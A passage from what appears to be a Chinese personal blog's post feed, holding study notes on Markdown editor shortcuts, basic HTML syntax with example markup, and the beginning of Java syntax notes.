style="text-align:center">Ctrl+Shift+]</td></tr><tr><td style="text-align:center">插入超链接</td><td style="text-align:center">Ctrl+K</td></tr><tr><td style="text-align:center">插入代码片</td><td style="text-align:center">Ctrl+Shift+`</td></tr><tr><td style="text-align:center">插入代码块</td><td style="text-align:center">Ctrl+Shift+K</td></tr><tr><td style="text-align:center">插入公式块</td><td style="text-align:center">Ctrl+Shift+M</td></tr><tr><td style="text-align:center">插入引用块</td><td style="text-align:center">Ctrl+Shift+Q</td></tr></tbody></table></div><h2 id="标题段落快捷键"><a href="#标题段落快捷键" class="headerlink" title="标题段落快捷键"></a>标题段落快捷键</h2><p>MarkDown支持六级标题，可以使用Ctrl+数字 指定不同层次的标题和段落</p><div class="table-container"><table><thead><tr><th style="text-align:left">功能</th><th style="text-align:left">快捷键</th></tr></thead><tbody><tr><td style="text-align:left">段落（正文）</td><td style="text-align:left">Ctrl+0</td></tr><tr><td style="text-align:left">一级标题</td><td style="text-align:left">Ctrl+1</td></tr><tr><td style="text-align:left">二级标题</td><td style="text-align:left">Ctrl+2</td></tr><tr><td style="text-align:left">三–六级标题(以此类推)</td><td style="text-align:left">Ctrl+3–6</td></tr><tr><td style="text-align:left">提升标题级别</td><td style="text-align:left">Ctrl+‘+’</td></tr><tr><td style="text-align:left">降低标题级别</td><td style="text-align:left">Ctrl+‘-’</td></tr></tbody></table></div><h1 id="拓展操作快键键"><a href="#拓展操作快键键" class="headerlink" title="拓展操作快键键"></a>拓展操作快键键</h1><h2 id="表格扩展快捷键"><a href="#表格扩展快捷键" class="headerlink" title="表格扩展快捷键"></a>表格扩展快捷键</h2><p>在表格中，可以使用鼠标拖动行或者列，达到交换行和列的目的</p><p>同时也可以使用快捷键操作</p><div class="table-container"><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td>下方插入行</td><td>Ctrl+Enter</td></tr><tr><td>上移该行</td><td>Alt+↑</td></tr><tr><td>下移该行</td><td>Alt+↓</td></tr><tr><td>左移该列</td><td>Win键+←</td></tr><tr><td>右移该列</td><td>Win键+→</td></tr><tr><td>删除该行</td><td>Ctrl+Shift+退格键(BackSpace)</td></tr></tbody></table></div><p>左右移动表格列的快捷键与WinDows系统自带的快捷键冲突，导致失效</p><p>删除行快捷键，不知道为什么没有生效</p><h2 id="视图操作快捷键"><a href="#视图操作快捷键" class="headerlink" title="视图操作快捷键"></a>视图操作快捷键</h2><h3 id="侧边栏"><a href="#侧边栏" class="headerlink" title="侧边栏"></a>侧边栏</h3><div class="table-container"><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td>大纲视图</td><td>Ctrl+Shift+1</td></tr><tr><td>文件列表视图</td><td>Ctrl+Shift+2</td></tr><tr><td>文件树视图</td><td></td></tr><tr><td>显示/隐藏侧边栏</td><td></td></tr><tr><td>放大视图</td><td>Ctrl+Shift+‘+’</td></tr><tr><td>缩小视图</td><td>Ctrl+Shift+‘-’</td></tr><tr><td>恢复原来大小视图</td><td>Ctrl+Shift+9</td></tr></tbody></table></div><h3 id="编辑模式"><a href="#编辑模式" class="headerlink" title="编辑模式"></a>编辑模式</h3><div class="table-container"><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td>源代码模式</td><td>Ctrl+/</td></tr><tr><td>专注模式(当前编辑行为黑，其他行为灰色)</td><td>F8</td></tr><tr><td>打字机模式(光标始终在屏幕中央位置)</td><td>F9</td></tr></tbody></table></div><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><div class="table-container"><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td>全屏</td><td>F11</td></tr><tr><td>应用内窗口切换</td><td>Ctrl+Tab</td></tr><tr><td>开发者工具</td><td>Shift+F12</td></tr></tbody></table></div><h2 id="搜索扩展快捷键"><a href="#搜索扩展快捷键" class="headerlink" title="搜索扩展快捷键"></a>搜索扩展快捷键</h2><div class="table-container"><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td>查找/搜索</td><td>Ctrl+F (或 Ctrl+Shift+F，但后者无效)</td></tr><tr><td>替换</td><td>Ctrl+H</td></tr><tr><td>查找下一个</td><td>F3</td></tr><tr><td>查找上一个</td><td>Shift+F3</td></tr></tbody></table></div><h1 id="基本操作快键键"><a href="#基本操作快键键" class="headerlink" title="基本操作快键键"></a>基本操作快键键</h1><h2 id="选择操作"><a href="#选择操作" class="headerlink" title="选择操作"></a>选择操作</h2><div class="table-container"><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td>全选</td><td>Ctrl+A</td></tr><tr><td>选择当前行/句</td><td>Ctrl+L</td></tr><tr><td>选择当前格式文本^ 注解1</td><td>Ctrl+E</td></tr><tr><td>选择当前单词^ 注解2</td><td>Ctrl+D</td></tr><tr><td>删除当前单词</td><td>Ctrl+Shift+D</td></tr></tbody></table></div><h2 id="跳转操作"><a href="#跳转操作" class="headerlink" title="跳转操作"></a>跳转操作</h2><div class="table-container"><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td>跳转到文首</td><td>Ctrl+Home</td></tr><tr><td>跳转到所选内容</td><td>Ctrl+J</td></tr><tr><td>跳转到文末</td><td>Ctrl+End</td></tr></tbody></table></div><h2 id="粘贴复制操作"><a href="#粘贴复制操作" class="headerlink" title="粘贴复制操作"></a>粘贴复制操作</h2><div class="table-container"><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td>普通复制</td><td>Ctrl+C</td></tr><tr><td>普通粘贴</td><td>Ctrl+V</td></tr><tr><td>剪切</td><td>Ctrl+X</td></tr><tr><td>复制为Markdown标记语法</td><td>Ctrl+Shift+C</td></tr><tr><td>粘贴为纯文本</td><td>Ctrl+Shift+V</td></tr></tbody></table></div><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><div class="table-container"><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td>新建</td><td>Ctrl+N</td></tr><tr><td>新建窗口(在Windows中，这两个作用一样)</td><td>Ctrl+Shift+N</td></tr><tr><td>打开文件</td><td>Ctrl+O</td></tr><tr><td>快速打开(在最近打开中打开)</td><td>Ctrl+P</td></tr><tr><td>保存</td><td>Ctrl+S</td></tr><tr><td>另存为</td><td>Ctrl+Shift+S</td></tr><tr><td>偏好设置</td><td>Ctrl+，</td></tr><tr><td>关闭</td><td>Ctrl+W</td></tr><tr><td>重新打开关闭的文件</td><td>Ctrl+Shift+T</td></tr></tbody></table></div><h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><div class="table-container"><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td>清除样式</td><td>Ctrl+\</td></tr><tr><td>增加缩进</td><td>Ctrl+]</td></tr><tr><td>减少缩进</td><td>Ctrl+[</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> Study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML学习总结</title>
      <link href="/posts/ba04c951.html"/>
      <url>/posts/ba04c951.html</url>
      
        <content type="html"><![CDATA[<p>写个笔记对HTML语法进行简单总结</p><h1 id="HTML简介"><a href="#HTML简介" class="headerlink" title="HTML简介"></a>HTML简介</h1><p>HTML（HyperText Markup Language）即超文本标记语言，是用于创建网页的标准标记语言。它通过一系列的标签（tags）和属性（attributes）来定义网页的结构和内容，浏览器根据这些标记来解析和显示网页。</p><h2 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h2><p>一个基本的HTML文档结构如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>文档标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 页面主体内容 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>主标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>段落内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;：声明文档类型为HTML5。</span><br><span class="line">&lt;html&gt;：HTML文档的根元素，lang属性指定语言。</span><br><span class="line">&lt;head&gt;：包含文档的元数据，如字符集、视口设置、标题等。</span><br><span class="line">&lt;body&gt;：包含网页的可见内容，如标题、段落、图像等。</span><br><span class="line">核心概念</span><br><span class="line">标签（Tags）</span><br><span class="line">标签是HTML的核心组成部分，用于定义文档的结构和内容。标签通常成对出现，如&lt;标签名&gt;内容&lt;/标签名&gt;，但也有自闭合标签如&lt;img&gt;。</span><br><span class="line">常见标签：</span><br><span class="line">&lt;h1&gt;到&lt;h6&gt;：标题标签，级别从高到低。</span><br><span class="line">&lt;p&gt;：段落。</span><br><span class="line">&lt;a&gt;：超链接。</span><br><span class="line">&lt;img&gt;：图像。</span><br><span class="line">&lt;ul&gt;、&lt;ol&gt;：列表。</span><br><span class="line">&lt;table&gt;：表格。</span><br><span class="line">&lt;form&gt;：表单。</span><br></pre></td></tr></table></figure></p><h2 id="属性（Attributes）"><a href="#属性（Attributes）" class="headerlink" title="属性（Attributes）"></a>属性（Attributes）</h2><p>属性提供关于标签的额外信息，通常以name=”value”的形式出现在起始标签中。</p><h3 id="常见属性"><a href="#常见属性" class="headerlink" title="常见属性"></a>常见属性</h3><p>href：指定链接的URL。<br>src：指定图像或脚本的URL。<br>alt：图像的替代文本。<br>class、id：用于CSS样式或JavaScript操作。<br>元数据（Metadata）<br>元数据描述了HTML文档的信息，如字符集、作者、关键词等，通常放在<head>部分。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;author&quot;</span> <span class="attr">content</span>=<span class="string">&quot;作者名称&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="HTML的作用"><a href="#HTML的作用" class="headerlink" title="HTML的作用"></a>HTML的作用</h3><p>HTML：主要用于构建网页的结构框架，定义了网页上各种元素的类型和展示方式。它与CSS（层叠样式表）和JavaScript（脚本语言）结合使用，可以创建功能丰富、样式美观的动态网页。</p><p>CSS：负责网页的外观和布局，通过选择器和样式规则控制元素的显示效果。</p><p>JavaScript：为网页添加交互功能，如响应用户事件、动态更新内容等。</p><h1 id="HTML语法"><a href="#HTML语法" class="headerlink" title="HTML语法"></a>HTML语法</h1><h2 id="基本结构-1"><a href="#基本结构-1" class="headerlink" title="基本结构"></a>基本结构</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>文档标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;styles.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 页面内容 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>段落内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="标签和属性"><a href="#标签和属性" class="headerlink" title="标签和属性"></a>标签和属性</h2><p>标签使用尖括号&lt; &gt;包裹，如<html><br>属性用于提供额外信息，格式为name=”value”<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;image.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;描述文字&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://example.com&quot;</span>&gt;</span>链接文字<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h2><h3 id="文本标签"><a href="#文本标签" class="headerlink" title="文本标签"></a>文本标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>到<span class="tag">&lt;<span class="name">h6</span>&gt;</span>：标题标签，h1最大，h6最小</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>：段落</span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span>：加粗</span><br><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span>：斜体</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>：换行</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span>：水平线</span><br></pre></td></tr></table></figure><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span>：无序列表</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>列表项1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>列表项2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span>：有序列表</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>列表项1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>列表项2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://example.com&quot;</span>&gt;</span>链接文字<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;mailto:email@example.com&quot;</span>&gt;</span>发送邮件<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="图像"><a href="#图像" class="headerlink" title="图像"></a>图像</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;image.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;描述文字&quot;</span> <span class="attr">width</span>=<span class="string">&quot;200&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span>：表格行</span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>表头单元格<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>普通单元格<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/submit&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入用户名&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;4&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;50&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;country&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;china&quot;</span>&gt;</span>中国<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;usa&quot;</span>&gt;</span>美国<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;male&quot;</span>&gt;</span> 男</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;reading&quot;</span>&gt;</span> 阅读</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="多媒体"><a href="#多媒体" class="headerlink" title="多媒体"></a>多媒体</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;audio.mp3&quot;</span> <span class="attr">type</span>=<span class="string">&quot;audio/mpeg&quot;</span>&gt;</span></span><br><span class="line">    您的浏览器不支持音频元素。</span><br><span class="line"><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;video.mp4&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span>&gt;</span></span><br><span class="line">    您的浏览器不支持视频元素。</span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>：块级容器</span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>：行内容器</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span>：页眉</span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span>&gt;</span>：导航栏</span><br><span class="line"><span class="tag">&lt;<span class="name">main</span>&gt;</span>：主要内容</span><br><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span>：内容区块</span><br><span class="line"><span class="tag">&lt;<span class="name">article</span>&gt;</span>：独立文章</span><br><span class="line"><span class="tag">&lt;<span class="name">aside</span>&gt;</span>：侧边栏</span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span>：页脚</span><br></pre></td></tr></table></figure><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>```html<br><!-- 这是一个注释 --></p>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java_Study</title>
      <link href="/posts/7ab040cc.html"/>
      <url>/posts/7ab040cc.html</url>
      
        <content type="html"><![CDATA[<p>最近一段时间在学习java，寒假学过一部分内容了，这里写个笔记来简单记录一下java的学习。(中文独享版)</p><h1 id="Java-语法学习总结"><a href="#Java-语法学习总结" class="headerlink" title="Java 语法学习总结"></a>Java 语法学习总结</h1><h2 id="一、基本语法"><a href="#一、基本语法" class="headerlink" title="一、基本语法"></a>一、基本语法</h2><h3 id="1-变量与数据类型"><a href="#1-变量与数据类型" class="headerlink" title="1. 变量与数据类型"></a>1. 变量与数据类型</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基本数据类型</span></span><br><span class="line"><span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line"><span class="type">double</span> <span class="variable">height</span> <span class="operator">=</span> <span class="number">1.75</span>;</span><br><span class="line"><span class="type">boolean</span> <span class="variable">isStudent</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"><span class="type">char</span> <span class="variable">grade</span> <span class="operator">=</span> <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串</span></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;张三&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 变量声明</span></span><br><span class="line"><span class="type">int</span> num1, num2, num3;</span><br></pre></td></tr></table></figure><h3 id="2-运算符"><a href="#2-运算符" class="headerlink" title="2. 运算符"></a>2. 运算符</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 算术运算符</span></span><br><span class="line"><span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">10</span> + <span class="number">20</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">difference</span> <span class="operator">=</span> <span class="number">20</span> - <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">product</span> <span class="operator">=</span> <span class="number">10</span> * <span class="number">20</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">quotient</span> <span class="operator">=</span> <span class="number">20</span> / <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">remainder</span> <span class="operator">=</span> <span class="number">20</span> % <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关系运算符</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isEqual</span> <span class="operator">=</span> (<span class="number">10</span> == <span class="number">20</span>);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">isGreater</span> <span class="operator">=</span> (<span class="number">20</span> &gt; <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逻辑运算符</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">andResult</span> <span class="operator">=</span> (<span class="literal">true</span> &amp;&amp; <span class="literal">false</span>);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">orResult</span> <span class="operator">=</span> (<span class="literal">true</span> || <span class="literal">false</span>);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">notResult</span> <span class="operator">=</span> !<span class="literal">true</span>;</span><br></pre></td></tr></table></figure><h3 id="3-控制结构"><a href="#3-控制结构" class="headerlink" 